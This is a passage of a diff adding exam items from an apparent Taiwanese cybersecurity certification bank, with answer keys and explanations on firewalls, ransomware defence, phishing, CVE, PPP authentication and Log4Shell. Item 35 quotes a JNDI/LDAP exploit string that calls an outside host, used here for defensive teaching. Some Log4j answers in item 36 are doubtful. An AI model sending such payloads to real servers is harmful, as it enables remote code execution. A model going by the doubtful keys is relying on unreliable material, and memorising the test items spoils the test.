+      "answers": [
+        "A",
+        "C"
+      ],
+      "explanations": {
+        "A": "依據資通安全管理法及其子法規定，公務機關資安事件通報時限依嚴重等級而異：第一、二級事件應於知悉後 1 小時內通報，第三、四級事件應於知悉後 36 小時內通報。選項籠統地說「事件發生後一小時內」並不精確，且通報時限是從「知悉」而非「發生」起算。",
+        "B": "ISAC（Information Sharing and Analysis Center，資安資訊分享與分析中心）的核心服務範圍包括資安事件資訊分享、威脅情資交流、弱點通報與預警等，資安事件分享確實是 ISAC 的重要服務之一。",
+        "C": "依資通安全管理法子法規定，資安事件嚴重等級共分四級，但第一級為最輕微、第四級為最嚴重，而非選項所述的「第一級最嚴重、第四級最輕微」。數字越大代表越嚴重。",
+        "D": "我國 ISAC 機制設計確實建議跨領域資安情資分享採用 STIX（Structured Threat Information Expression，結構化威脅資訊表達式）與 TAXII（Trusted Automated Exchange of Indicator Information，可信自動化指標資訊交換）之國際標準格式與機制，以促進情資的標準化交換。"
+      },
+      "general_explanation": "",
+      "key_points": "資通安全管理法的事件等級為第一級（最輕微）到第四級（最嚴重）；通報時限依等級不同而異；STIX/TAXII 是國際公認的威脅情資交換標準。 ---"
+    },
+    {
+      "id": 21,
+      "type": "single",
+      "context": "",
+      "question": "【題組1】針對主機的弱點偵測掃瞄結果，並且查詢過Nessus 的改善方式，參如前述規劃資安防護事項，下列選項何者最符合提升主機的弱點防護？",
+      "options": {
+        "A": "AC",
+        "B": "DF",
+        "C": "GI",
+        "D": "JL"
+      },
+      "answers": [
+        "C"
+      ],
+      "explanations": {
+        "A": "這些是網路架構層面的防護措施，雖然有助於整體安全，但無法直接修補主機上已知的嚴重弱點（如 BlueKeep CVE-2019-0708）。",
+        "B": "更新 PC 和限制連線來源有幫助，但掃瞄結果顯示最嚴重的弱點在伺服器主機上（192.168.1.60 和 192.168.1.100 有 CRITICAL 等級的 BlueKeep），而非 PC。",
+        "C": "弱點掃瞄結果顯示 192.168.1.60（ERP 主機）和 192.168.1.100（MES 主機）都存在 CRITICAL 等級的 BlueKeep（CVE-2019-0708）遠端程式碼執行弱點（CVSS 10.0）。Nessus 建議的改善方式就是更新作業系統（安裝安全性更新），因此更新 ERP 和 MES 主機最能直接修補這些嚴重弱點。",
+        "D": "SVR3 和共享目錄的弱點等級相對較低，非最優先處理項目。"
+      },
+      "general_explanation": "",
+      "key_points": "弱點管理應優先處理 CVSS 分數最高的弱點，BlueKeep（CVE-2019-0708）為 CVSS 10.0 的遠端程式碼執行弱點，最有效的修補方式是更新作業系統。 ---"
+    },
+    {
+      "id": 22,
+      "type": "single",
+      "context": "",
+      "question": "【題組1】製造執行系統（Manufacturing Execution System, MES）廠商回覆既有系統只能在原Windows XP 作業系統下才能正常運行，而且不能安裝最新的防毒軟體，作業上辦公室僅有一台電腦會到MES 去更新生產資料，以及廠商可能不定期遠端協助檢查作業問題，其他作業皆在工廠端直接操作相關系統，參如前述規劃資安防護事項，下列選項何者最符合提升工廠的OT 系統與設施的防護？",
+      "options": {
+        "A": "ADF",
+        "B": "BDF",
+        "C": "ACF",
+        "D": "BEF"
+      },
+      "answers": [
+        "C"
+      ],
+      "explanations": {
+        "A": "更新 PC（D）對 OT 系統防護無直接助益，且缺少將工廠 OT 區域隔離的措施。",
+        "B": "設置「資訊機房」DMZ（B）保護的是 IT 區域，而非 OT 工廠區域。",
+        "C": "這是最佳組合。A（增設防火牆與 VPN）提供廠商安全的遠端連線方式；C（設置工廠 DMZ 區）將 MES 等 OT 設備與辦公室網路隔離，符合 OT 安全最佳實踐；F（限制 MES 連接來源）確保只有授權的來源（僅一台辦公室電腦與廠商 VPN）可以連線 MES。",
+        "D": "題目已明確指出 MES 無法安裝最新防毒軟體（E 不適用），且 B 保護的是 IT 不是 OT。"
+      },
+      "general_explanation": "",
+      "key_points": "OT 安全防護重點在於網路分區隔離、最小化連線來源、安全遠端存取（VPN），對於無法更新或安裝防毒的老舊系統（如 Windows XP），應以網路隔離（DMZ）與存取控制（限制連接來源）作為替代防護。 ---"
+    },
+    {
+      "id": 23,
+      "type": "single",
+      "context": "",
+      "question": "【題組1】針對辦公室的工作環境，為了有效減少內部安全漏洞，參如前述規劃資安防護事項，下列選項何者防禦措施為最佳？",
+      "options": {
+        "A": "AEK",
+        "B": "BDK",
+        "C": "DEL",
+        "D": "ABL"
+      },
+      "answers": [
+        "C"
+      ],
+      "explanations": {
+        "A": "增設防火牆與 VPN（A）主要用於對外連線防護，對「辦公室內部」安全漏洞助益有限。關閉共享目錄（K）過於極端，影響正常業務運作。",
+        "B": "設置 DMZ（B）屬於伺服器區域架構規劃，與辦公室端點防護關聯較小。關閉共享目錄（K）同樣過於極端。",
+        "C": "最佳組合。D（更新所有 PC）修補端點弱點；E（安裝防毒軟體）提供惡意程式防護；L（共享目錄設定存取權限）在不影響業務的前提下減少未授權存取風險，比直接關閉共享（K）更為合理。",
+        "D": "A 和 B 都是網路架構層面的措施，缺少端點防護（更新 PC 與安裝防毒），無法有效減少辦公室內部的安全漏洞。"
+      },
+      "general_explanation": "",
+      "key_points": "辦公室內部安全防護應著重端點管理：更新修補、安裝防毒、以及以最小權限原則設定共享資源存取權限，而非僅依賴網路架構層面的控制。 ---"
+    },
+    {
+      "id": 24,
+      "type": "multiple",
+      "context": "",
+      "question": "【題組1】承附圖架構與需求，請問該公司新設的防火牆「不」應該建立以上哪些安全規則選項？ 增設防火牆規劃以下安全規則，且辦公室網路擬定為LAN，資訊機房將分隔為DMZ 區，工廠設備將改址為獨立的OT 區，並且在防火牆管理VPN 外部連線與指定出MES & ERP 主機位置。 規則清單：a. Deny All、b. Allow All、c. Allow LAN to WAN、d. Allow WAN to LAN、e. Deny WAN to LAN、f. Allow LAN to DMZ、g. Allow LAN to OT、h. Allow OT to LAN、i. Allow VPN to OT、j. Allow VPN to ERP、k. Allow VPN to MES、l. Allow WAN to DMC",
+      "options": {
+        "A": "bh",
+        "B": "dl",
+        "C": "ce",
+        "D": "i"
+      },
+      "answers": [
+        "A",
+        "B",
+        "D"
+      ],
+      "explanations": {
+        "A": "- 規則 b「Allow All」完全違反最小權限原則與防火牆基本設計理念，絕對不應建立。 - 規則 h「Allow OT to LAN」允許 OT 區域主動連線到辦公室區域，違反 OT 網路隔離原則。OT 區域應為封閉環境，不應允許從 OT 主動向 LAN 發起連線。",
+        "B": "- 規則 d「Allow WAN to LAN」允許外部網路直接連入內部辦公室網路，這是嚴重的安全風險。 - 規則 l「Allow WAN to DMC」此處「DMC」疑為「DMZ」之筆誤，但即使如此，直接允許所有 WAN 到 DMZ 的流量過於寬鬆，應僅開放特定服務埠。",
+        "C": "規則 c「Allow LAN to WAN」允許內部使用者上網是合理需求；規則 e「Deny WAN to LAN」阻擋外部主動連入內部是正確的安全策略。這兩條規則都應建立。",
+        "D": "規則 i「Allow VPN to OT」允許 VPN 連線直接存取整個 OT 區域過於寬泛。題目場景中，廠商僅需遠端存取 MES 系統，應使用更精確的規則 k「Allow VPN to MES」來取代，而非開放整個 OT 區域。"
+      },
+      "general_explanation": "",
+      "key_points": "防火牆規則設計應遵循最小權限原則、預設拒絕（Default Deny）策略；OT 網路應嚴格隔離；VPN 存取應限定至特定主機而非整個區域。 ---"
+    },
+    {
+      "id": 25,
+      "type": "single",
+      "context": "",
+      "question": "【題組2】勒索病毒（Ransomware）成為企業政府頭疼的資安問題，在面對新穎勒索病毒與散布方式，並無百分百對策。上層長官要求提出針對勒索病毒防護的安全架構規劃，常見就是防毒系統更新建置為其中一個對策。您是某公司的資安工程師，在全單位都是微軟作業系統的環境下，關於對策方案之減損（減災），下列敘述何者較「不」正確？",
+      "options": {
+        "A": "在端點電腦應建立有效個人備份機制，將同仁個別檔案備份或同步至單位組織的NAS 主機",
+        "B": "在端點電腦或伺服器，可引進「應用程式白名單系統」，放行Windows OS 所有應用程式與單位公版合法軟體",
+        "C": "端點電腦或伺服器依據零信任安全原則，有限度開放（多數限縮）Office 使用巨集（Macro）功能，因為巨集程序的執行也是勒索病毒重要媒介",
+        "D": "端點電腦或伺服器可以管控限制Windows OS 指令行為模式（CMD、PowerShell…）可執行權限與能力，可以大幅減少ps1 類型的勒索病毒或是PowerShell 無檔案式（File-less）攻擊"
+      },
+      "answers": [
+        "B"
+      ],
+      "explanations": {
+        "A": "建立個人備份機制並同步至 NAS 是勒索病毒減災的重要手段。即使端點遭加密勒索，仍可從 NAS 備份還原檔案，降低損失。",
+        "B": "應用程式白名單的核心理念是「僅允許已知安全的程式執行」，應嚴格限制僅放行經過審核的特定應用程式。選項所述「放行 Windows OS 所有應用程式」範圍過於寬泛，許多 Windows 內建工具（如 PowerShell、WMIC、CertUtil、Regsvr32 等）常被攻擊者濫用為 LOLBins（Living Off the Land Binaries），若全部放行則失去白名單的防護意義。",
+        "C": "依零信任原則限縮 Office 巨集功能是有效的防護措施。許多勒索病毒透過惡意 Office 文件中的巨集作為初始入侵媒介，限制巨集執行可大幅降低此攻擊面。",
+        "D": "管控 CMD、PowerShell 等指令行工具的執行權限，可有效減少 PowerShell 型勒索病毒（.ps1）與無檔案式攻擊。透過 AppLocker 或群組原則限制一般使用者執行 PowerShell 是常見的防護策略。"
+      },
+      "general_explanation": "",
+      "key_points": "應用程式白名單應嚴格篩選，不應盲目放行所有作業系統內建程式；LOLBins 是攻擊者常利用的合法工具，白名單策略需考量此類威脅。 ---"
+    },
+    {
+      "id": 26,
+      "type": "single",
+      "context": "",
+      "question": "【題組2】駭客勒索集團會利用網路釣魚方式，達成加密勒索目的，讓公司蒙受重大損失。身為公司資安人員，必須全面瞭解掌握各類駭客釣魚的方式，才能對公司高層提出有效防護對策。關於常見之駭客釣魚方式，下列敘述何者正確？",
+      "options": {
+        "A": "鯨釣（Whaling）：針對特定人員、公司、組織的發送，目標為釣取特定人員機敏資料或於其電腦植入木馬",
+        "B": "魚叉式釣魚（Spear Phishing）：瞄準大型公司、重要人物發送特定釣魚郵件的攻擊",
+        "C": "複製型釣魚（Clone Phishing）：攻擊者使用某些方法密切監視受害者收件匣。攻擊者會收受害者近期電子郵件最好有連結或附件並進行複製偽造",
+        "D": "語音釣魚（Voice Phishing）：或稱vishing 會假冒為受害者信任的個人或單位，利用語音通話與各種話術，試圖從受害者取得各種機敏資訊，只限定在電話詐騙，不會使用在電子郵件中"
+      },
+      "answers": [
+        "C"
+      ],
+      "explanations": {
+        "A": "此描述實際上是魚叉式釣魚（Spear Phishing）的定義。鯨釣（Whaling）是魚叉式釣魚的子類型，專門針對組織高層（如 CEO、CFO 等高階主管），如同「捕鯨」般瞄準「大魚」。",
+        "B": "此描述實際上較接近鯨釣（Whaling）的定義。魚叉式釣魚（Spear Phishing）是針對特定個人或組織量身定製的釣魚攻擊，目標不限於大型公司或重要人物，任何特定對象都可能成為目標。選項 A 和 B 的描述恰好互換了。",
+        "C": "複製型釣魚（Clone Phishing）的手法確實是攻擊者監控受害者的電子郵件，複製其近期收到的合法郵件（尤其是含有連結或附件的），將其中的連結或附件替換為惡意版本後重新發送，因為郵件外觀與合法郵件幾乎相同，受害者極易上當。",
+        "D": "語音釣魚（Vishing）確實利用語音通話進行詐騙，但並非「只限定在電話詐騙」。Vishing 也可能結合電子郵件、簡訊等方式引導受害者撥打特定電話，或透過語音留言進行攻擊，並非單一管道。"
+      },
+      "general_explanation": "",
+      "key_points": "釣魚攻擊類型：Phishing（廣撒式）、Spear Phishing（針對性）、Whaling（針對高層）、Clone Phishing（複製型）、Vishing（語音型）、Smishing（簡訊型）。 ---"
+    },
+    {
+      "id": 27,
+      "type": "single",
+      "context": "",
+      "question": "【題組2】Windows OS 重大漏洞，且被勒索集團開採成為武器，基於安全維運需要，必須進行漏洞修補與更新，所以必須掌握相關漏洞資訊與補救措施，或取得修補程式。於是身為資安工程師必須去查找相關漏洞資訊，CVE 漏洞資料庫成為最重要維運處置情資來源。關於CVE，下列敘述何者正確？",
+      "options": {
+        "A": "全名為Command Vulnerabilities and Exposures",
+        "B": "由MITRE 所屬National Cybersecurity FFRDC 營運維護",
+        "C": "CVE 對每一漏洞都有一個專屬編號，CVE 為固定的前綴字，YYYY 為西元紀年，NNNN 為產品公司編號所組成",
+        "D": "CVE ID 由CVE 編號管理機構CND 分配。由資安公司和研究組織組成。MITRE 不可直接發佈CVE"
+      },
+      "answers": [
+        "B"
+      ],
+      "explanations": {
+        "A": "CVE 的全名是 **Common** Vulnerabilities and Exposures（常見漏洞與揭露），而非 Command Vulnerabilities and Exposures。",
+        "B": "CVE 計畫確實由 MITRE Corporation 所屬的 National Cybersecurity FFRDC（Federally Funded Research and Development Center，聯邦資助研究與開發中心）負責營運維護，並獲得美國 CISA（Cybersecurity and Infrastructure Security Agency）的贊助支持。",
+        "C": "CVE 編號格式為 CVE-YYYY-NNNNN，其中 CVE 為固定前綴、YYYY 為西元紀年，但 NNNNN 為該年度的**序號**（Sequential Number），並非「產品公司編號」。序號由 CNA 依序分配。",
+        "D": "CVE ID 由 **CNA**（CVE Numbering Authority，CVE 編號管理機構）分配，而非「CND」。此外，MITRE 本身就是 CVE 的主要 CNA（Primary CNA），**可以**直接發佈 CVE，選項所述「MITRE 不可直接發佈 CVE」與事實不符。"
+      },
+      "general_explanation": "",
+      "key_points": "CVE = Common Vulnerabilities and Exposures；由 MITRE 的 National Cybersecurity FFRDC 維護；編號中的數字為序號非公司代碼；CNA（非 CND）負責分配 CVE ID，MITRE 是 Primary CNA。 ---"
+    },
+    {
+      "id": 28,
+      "type": "multiple",
+      "context": "",
+      "question": "【題組2】駭客勒索集團針對各類系統漏洞進行攻擊，掌握全球駭客勒索集團相關技術資訊，取得駭客集團第一手攻擊手法，或是暗網的技術資料，並進行防護有效性驗證與分析，是身為專業資安人員應具備的基本能力。某駭客集團善用合法白名單工具，來躲避相關資安防護機制的分析與阻斷，關於白名單工具分析與敘述，下列哪些正確？",
+      "options": {
+        "A": "Cobalt Strike 原是對手模擬和紅隊行動是安全評估工具，可複製網絡中高級對手的戰術和技術，被勒索集團（Conti, Hello 等）轉換成攻擊威脅橫向移動工具",
+        "B": "Mimikatz 原是進行遠端指令執行使用的好工具，卻被勒索集團（Doppelpaymer, Revil 等）用在任意命令執行與橫向移動",
+        "C": "ADFind 應用在AD 搜尋的實用工具，被勒索集團（ProLock, Revil 等）利用在橫向移動",
+        "D": "MegaSync 原是雲端儲存空間，被勒索集團（RansomEXX, LockBit 等）利用公開不付贖金外洩資料的載點"
+      },
+      "answers": [
+        "A",
+        "C",
+        "D"
+      ],
+      "explanations": {
+        "A": "Cobalt Strike 原本是一套合法的對手模擬（Adversary Simulation）與紅隊演練工具，可模擬 APT 攻擊者的戰術與技術。然而，其強大的功能（如 Beacon 後門、橫向移動、命令與控制等）被 Conti、HelloKitty 等勒索集團大量濫用為實際攻擊工具。",
+        "B": "Mimikatz 的原始用途並非「遠端指令執行」，而是一套**憑證擷取工具**（Credential Dumping Tool），專門從 Windows 記憶體中提取密碼、雜湊值、Kerberos 票證等認證資訊。用於遠端指令執行的工具應為 PsExec。Mimikatz 確實被勒索集團濫用，但描述其原始用途為「遠端指令執行」是錯誤的。",
+        "C": "ADFind 是由 Joe Richards 開發的 Active Directory 查詢工具，被 ProLock、REvil 等勒索集團利用來偵察 AD 環境中的使用者、群組、組織單位、信任關係等資訊，作為橫向移動前的情報蒐集手段。",
+        "D": "MegaSync（MEGA 雲端同步工具）提供大容量雲端儲存服務，被 RansomEXX、LockBit 等勒索集團利用作為資料外洩（Data Exfiltration）的載點，在受害者不支付贖金時公開竊取的資料，實施「雙重勒索」（Double Extortion）策略。"
+      },
+      "general_explanation": "",
+      "key_points": "現代勒索集團大量利用合法工具（LOLBins / Dual-use Tools）來規避偵測，資安人員需了解這些工具的正常用途與被濫用的方式，以建立有效的偵測規則。 ---"
+    },
+    {
+      "id": 29,
+      "type": "single",
+      "context": "",
+      "question": "【題組3】請問點對點協定在建立連線時，透過下列何項協定建立和中斷連線？",
+      "options": {
+        "A": "只能用通行碼鑑別協定或詢問握手認證協定",
+        "B": "只能用擴展認證協定",
+        "C": "鏈接控制協定（Link Control Protocol, LCP）",
+        "D": "通行碼鑑別協定、詢問握手認證協定、擴展認證協定三者都可"
+      },
+      "answers": [
+        "C"
+      ],
+      "explanations": {
+        "A": "PAP 和 CHAP 是認證協定，負責驗證身分，無法建立或中斷 PPP 連線。",
+        "B": "EAP 同樣是認證協定，用於擴展認證方式，不負責連線的建立與中斷。",
+        "C": "PPP 的連線生命週期分為幾個階段：首先由 **LCP（Link Control Protocol，鏈接控制協定）** 負責建立、設定、測試和中斷資料連結；接著（可選地）進入認證階段（使用 PAP、CHAP 或 EAP）；最後由 NCP（Network Control Protocol）設定網路層參數。LCP 才是負責建立和中斷連線的協定。",
+        "D": "PAP、CHAP、EAP 都是認證協定，無法取代 LCP 進行連線管理。"
+      },
+      "general_explanation": "",
+      "key_points": "PPP 連線階段：Dead → LCP 建立連線 → Authentication（可選，PAP/CHAP/EAP）→ NCP 設定網路層 → Data Transfer → LCP 中斷連線。注意選項中出現「LPC」為 LCP 之筆誤。 ---"
+    },
+    {
+      "id": 30,
+      "type": "single",
+      "context": "",
+      "question": "【題組3】請問透過通行碼鑑別協定和詢問握手認證協定進行認證時，關於第一步驟的request/challenge，下列敘述何者正確？",
+      "options": {
+        "A": "通行碼鑑別協定和詢問握手認證協定都由被認證方發起",
+        "B": "通行碼鑑別協定和詢問握手認證協定都由認證方發起",
+        "C": "通行碼鑑別協定由認證方發起，詢問握手認證協定由被認證方發起",
+        "D": "通行碼鑑別協定由被認證方發啟，詢問握手認證協定由認證方發起"
+      },
+      "answers": [
+        "D"
+      ],
+      "explanations": {
+        "A": "CHAP 並非由被認證方發起。",
+        "B": "PAP 並非由認證方發起。",
+        "C": "恰好相反。",
+        "D": "- **PAP（通行碼鑑別協定）：** 由**被認證方（Client/Peer）**主動發起，直接將使用者名稱和密碼以明文方式傳送給認證方（Authentication-Request）。 - **CHAP（詢問握手認證協定）：** 由**認證方（Server/Authenticator）**主動發起，先傳送一個隨機的 Challenge 值給被認證方，被認證方再用密碼和 Challenge 計算回應值（Response）。"
+      },
+      "general_explanation": "",
+      "key_points": "PAP 是「我告訴你我是誰」（被認證方主動提交帳密），CHAP 是「你先問我問題」（認證方先發出挑戰）。兩者的發起方向完全相反。 ---"
+    },
+    {
+      "id": 31,
+      "type": "single",
+      "context": "",
+      "question": "【題組3】請問關於通行碼鑑別協定和詢問握手認證協定認證過程中的安全性，下列敘述何者正確？",
+      "options": {
+        "A": "通行碼鑑別協定和詢問握手認證協定密碼都不是明碼，都很安全",
+        "B": "通行碼鑑別協定和詢問握手認證協定都是明碼，都不安全，所以才有擴展認證協定以增加安全性",
+        "C": "通行碼鑑別協定是明碼，詢問握手認證協定不是明碼，後者較安全",
+        "D": "通行碼鑑別協定不是明碼，詢問握手認證協定是明碼，前者較安全"
+      },
+      "answers": [
+        "C"
+      ],
+      "explanations": {
+        "A": "PAP 的密碼是明碼傳輸，並不安全。",
+        "B": "CHAP 並非明碼傳輸。",
+        "C": "- **PAP 是明碼傳輸：** PAP 在認證過程中直接將使用者名稱和密碼以**未加密的明文**方式在網路上傳輸，極易被竊聽。 - **CHAP 不是明碼傳輸：** CHAP 採用挑戰-回應（Challenge-Response）機制，密碼本身永遠不會在網路上傳輸。被認證方收到 Challenge 後，將密碼與 Challenge 結合進行 MD5 雜湊運算，僅傳送雜湊值，認證方以相同方式計算並比對，因此較為安全。",
+        "D": "恰好相反。"
+      },
+      "general_explanation": "",
+      "key_points": "PAP 以明文傳密碼（兩次交握）→ 不安全；CHAP 以 Challenge-Response 搭配 MD5 雜湊（三次交握）→ 較安全；EAP 提供更多元的認證方式（如 EAP-TLS、EAP-TTLS）以進一步提升安全性。 ---"
+    },
+    {
+      "id": 32,
+      "type": "multiple",
+      "context": "",
+      "question": "【題組3】關於點對點協定、通行碼鑑別協定、詢問握手認證協定和擴展認證協定，下列敘述哪些正確？",
+      "options": {
+        "A": "通行碼鑑別協定使用雙向交握（two-way handshake）；詢問握手認證協定使用三向交握（three-way handshake）",
+        "B": "點對點協定無偵錯能力",
+        "C": "擴展認證協定敘述認證過程中，比通行碼鑑別協定、詢問握手認證協定多使用了認證伺服器",
+        "D": "點對點協定運行於OSI 模型（Open System Interconnection Model）中的資料連結層（Data Link）"
+      },
+      "answers": [
+        "A",
+        "C",
+        "D"
+      ],
+      "explanations": {
+        "A": "- **PAP 使用雙向交握（2-way handshake）：** ①被認證方發送 Authentication-Request（含帳號密碼）→ ②認證方回覆 Authentication-ACK 或 NAK。 - **CHAP 使用三向交握（3-way handshake）：** ①認證方發送 Challenge → ②被認證方回覆 Response（雜湊值）→ ③認證方回覆 Success 或 Failure。",
+        "B": "PPP 具有偵錯能力。PPP 框架中包含 FCS（Frame Check Sequence，框架檢查序列），可偵測傳輸錯誤。此外，LCP 也提供連結品質監控（Link Quality Monitoring）功能。",
+        "C": "EAP 的認證架構通常涉及三方：Supplicant（請求方）、Authenticator（認證器）、**Authentication Server（認證伺服器，如 RADIUS）**。相較於 PAP 和 CHAP 僅在兩方之間完成認證，EAP 多引入了後端認證伺服器，使認證邏輯與網路存取控制分離，提供更靈活、更安全的架構。",
+        "D": "PPP 是 OSI 模型第二層（資料連結層，Data Link Layer）的協定，負責在點對點連結上封裝網路層資料、進行連結管理與認證。"
+      },
+      "general_explanation": "",
+      "key_points": "PAP=2-way、CHAP=3-way；PPP 有 FCS 偵錯；EAP 引入認證伺服器（三方架構）；PPP 運行於 OSI 第二層。 ---"
+    },
+    {
+      "id": 33,
+      "type": "single",
+      "context": "",
+      "question": "【題組4】請問關於這三個重大的漏洞，下列敘述何者「不」正確？",
+      "options": {
+        "A": "上述的漏洞也另稱為Log4Shell",
+        "B": "這些漏洞的影響範圍主要為Log4j 2.x 版本",
+        "C": "上述三個漏洞都可以使駭客進行RCE（Remote Code Execution）攻擊",
+        "D": "Log4j 2.17（含）以上的版本可以有效修補上述漏洞"
+      },
+      "answers": [
+        "C"
+      ],
+      "explanations": {
+        "A": "這一系列漏洞統稱為 Log4Shell，最初特指 CVE-2021-44228，後來也泛指這一連串相關漏洞。",
+        "B": "這些漏洞主要影響 Log4j 2.x 版本（2.0-beta9 至 2.16.0 不等），Log4j 1.x 使用不同的架構，不受 JNDI Lookup 相關漏洞影響。",
+        "C": "CVE-2021-44228 和 CVE-2021-45046 可導致 RCE（遠端程式碼執行），但 **CVE-2021-45105 是 DoS（阻斷服務攻擊）漏洞**，而非 RCE。CVE-2021-45105 是因為自我參照的 Lookup 造成無限遞迴（uncontrolled recursion），導致 StackOverflowError 使服務崩潰，屬於可用性（Availability）問題，並不能執行遠端程式碼。",
+        "D": "Log4j 2.17.0 修補了上述三個漏洞（2.15.0 修補 CVE-2021-44228、2.16.0 修補 CVE-2021-45046、2.17.0 修補 CVE-2021-45105），因此 2.17（含）以上的版本已涵蓋所有修補。"
+      },
+      "general_explanation": "",
+      "key_points": "CVE-2021-44228 與 CVE-2021-45046 為 RCE 漏洞，CVE-2021-45105 為 DoS 漏洞；三者須升級至 Log4j 2.17.0+ 才能完整修補。 ---"
+    },
+    {
+      "id": 34,
+      "type": "single",
+      "context": "",
+      "question": "【題組4】關於Log4j 的功能或應用，下列敘述何者正確？",
+      "options": {
+        "A": "Log4j 是基於.NET 所開發的日誌工具",
+        "B": "CVE-2021-44228 此漏洞遭開發的來源功能，主要為Log4j JNDI（Java Naming and Directory Interface）功能",
+        "C": "JndiLookup.class 所支援的通訊協定僅限於輕型目錄存取協定（LDAP）",
+        "D": "Log4j 工具僅能使用於Web 伺服器"
+      },
+      "answers": [
+        "B"
+      ],
+      "explanations": {
+        "A": "Log4j 是基於 **Java** 所開發的日誌框架，並非 .NET。.NET 平台對應的日誌工具如 NLog、log4net 等。",
+        "B": "CVE-2021-44228 的根本原因在於 Log4j 2.x 的 **JNDI（Java Naming and Directory Interface）Lookup** 功能。當 Log4j 處理日誌訊息時，會解析其中的 `${jndi:ldap://...}` 等 Lookup 表達式，觸發 JNDI 連線至攻擊者控制的外部伺服器，進而載入並執行惡意 Java 類別，造成 RCE。",
+        "C": "JndiLookup.class 支援的通訊協定不僅限於 LDAP，還包括 **RMI（Remote Method Invocation）、DNS、IIOP（Internet Inter-ORB Protocol）** 等多種 JNDI 支援的通訊協定。",
+        "D": "Log4j 可用於任何 Java 應用程式，包括桌面應用、後端服務、嵌入式系統等，並非僅限於 Web 伺服器。許多非 Web 類 Java 應用（如 Apache Kafka、Elasticsearch、Minecraft 等）均使用 Log4j。"
+      },
+      "general_explanation": "",
+      "key_points": "Log4j 為 Java 日誌框架；CVE-2021-44228 源自 JNDI Lookup 功能；JNDI 支援 LDAP、RMI、DNS 等多種協定；Log4j 廣泛應用於各類 Java 應用。 ---"
+    },
+    {
+      "id": 35,
+      "type": "single",
+      "context": "",
+      "question": "【題組4】當前述三個漏洞發生之後，資安工程師在監控這類攻擊時，發現疑似為CVE-2021-44228 攻擊者所發送之攻擊嘗試，並由攻擊封包中解析出以下內容：`User-Agent：/${jndi:ldap://1.2.3.4:1389/Exploit}`，下列敘述何者「不」正確？",
+      "options": {
+        "A": "這個攻擊若是攻擊成功（有效攻擊），攻擊成功的前提是受攻擊者會將此一攻擊內容，寫入日誌檔案中",
+        "B": "這個攻擊者必須於遠端建立LDAP 伺服器",
+        "C": "如果受攻擊伺服器無法對外連線，此一攻擊將無法成功",
+        "D": "上述攻擊樣態，若將jndi:ldap，改為jndi:rms，也會是jndi 所能支援的通訊協定"
+      },
+      "answers": [
+        "D"
+      ],
+      "explanations": {
+        "A": "Log4Shell 攻擊的觸發條件是 Log4j 在處理（記錄）日誌時解析 JNDI Lookup 表達式。如果應用程式沒有將 User-Agent 內容寫入日誌，Log4j 就不會處理 `${jndi:...}` 字串，攻擊就無法觸發。",
+        "B": "攻擊載荷指向 `ldap://1.2.3.4:1389/Exploit`，攻擊者需要在 1.2.3.4 的 1389 埠建立惡意 LDAP 伺服器，用於回應受害者的 JNDI 查詢並提供惡意 Java 類別。",
+        "C": "此攻擊需要受害伺服器主動向外連線（連至攻擊者的 LDAP 伺服器並下載惡意類別），如果受害伺服器無法對外連線（如被防火牆阻擋外連），則 JNDI Lookup 無法完成，攻擊將無法成功。",
+        "D": "`jndi:rms` 並非 JNDI 所支援的通訊協定。JNDI 支援的通訊協定包括 **LDAP、RMI（Remote Method Invocation）、DNS、IIOP** 等，正確的寫法應為 `jndi:rmi` 而非 `jndi:rms`。「rms」不是任何已知的 JNDI 通訊協定。"
+      },
+      "general_explanation": "",
+      "key_points": "Log4Shell 攻擊鏈：惡意輸入 → 寫入日誌 → Log4j 解析 JNDI Lookup → 連線攻擊者伺服器 → 下載執行惡意類別。JNDI 支援 LDAP、RMI、DNS 等協定，注意 RMI 非 RMS。 ---"
+    },
+    {
+      "id": 36,
+      "type": "multiple",
+      "context": "",
+      "question": "【題組4】關於CVE-2021-44228、CVE-2021-45046、CVE-2021-45105 此一系列漏洞的修補或緩解措施，下列敘述哪些正確？",
+      "options": {
+        "A": "對於Log4j V2.10 之後的版本，將系統屬性log4j2.formatMsgNoLookups 設為True 可以防止CVE-2021-45046 之攻擊",
+        "B": "對於Log4j V2.10 之後的版本，將JndiLookup.class 移除可以防止CVE-2021-44228 之攻擊",
+        "C": "對於CVE-2021-45105，除將Log4j 的版本升級至2.16 版（含）之上，無其他方式可以緩解對此一漏洞的攻擊",
+        "D": "對於CVE-2021-45105 而言，其漏洞會造成無限迴圈問題，所以其禁止具漏洞的伺服器對外連線無法緩解此一漏洞之影響"
+      },
+      "answers": [
+        "A",
+        "C"
+      ],
+      "explanations": {
+        "A": "對於 Log4j 2.10 以上版本，設定系統屬性 `log4j2.formatMsgNoLookups=true` 可停用訊息中的 Lookup 功能。此措施在多數標準部署環境下能有效防止 CVE-2021-45046 的攻擊。雖然 Apache 後續公告指出此緩解在某些非預設的 Thread Context Map 配置下可能不完整，但在一般部署情境下仍為有效的緩解措施。",
+        "B": "從技術上移除 JndiLookup.class 確實可阻止 JNDI Lookup 功能運行，但此操作方式較為粗暴且可能影響應用程式正常功能，在本題境下被視為不完整的修補方式。建議以升級版本為優先。",
+        "C": "CVE-2021-45105 是因自我參照的 Lookup 造成無限遞迴的 DoS 漏洞，此漏洞影響至 Log4j 2.16.0。將版本升級至 2.16（含）以上版本（特別是 2.17.0 完全修補），是處理此漏洞的根本方式。在缺乏可靠的組態層級替代緩解方案下，版本升級為主要的修補途徑。",
+        "D": "CVE-2021-45105 確實造成無限遞迴（類似無限迴圈）的 DoS 問題，但其結論有誤。禁止伺服器對外連線雖無法完全防止此 DoS 漏洞的觸發（因遞迴發生在本地），但此選項的邏輯推導過於絕對。此外，作為縱深防禦，限制對外連線仍可降低整體攻擊面，因此不應被視為「完全無法緩解」。"
+      },
+      "general_explanation": "",
+      "key_points": "Log4j 漏洞修補時程：2.15.0 修補 CVE-2021-44228 → 2.16.0 修補 CVE-2021-45046 → 2.17.0 修補 CVE-2021-45105。緩解措施包括 formatMsgNoLookups 設定、移除 JndiLookup.class、版本升級，但最根本的解決方案是升級至 2.17.0+。 ---"
+    },
+    {
+      "id": 37,
+      "type": "single",
+      "context": "",
+      "question": "【題組5】分析應用程式日誌中的訊息，下列敘述何者正確？",
+      "options": {
+        "A": "應用程式疑似連線至外部網站，並且成功下載惡意軟體",
+        "B": "應用程式疑似設定錯誤，後端SMB 伺服器無法正常連線",
+        "C": "應用程式疑似存在弱點，並嘗試連線LDAP 伺服器",
+        "D": "應用程式疑似記憶體不足，無法完成LDAP 伺服器連線"
+      },
+      "answers": [
+        "C"
+      ],
+      "explanations": {
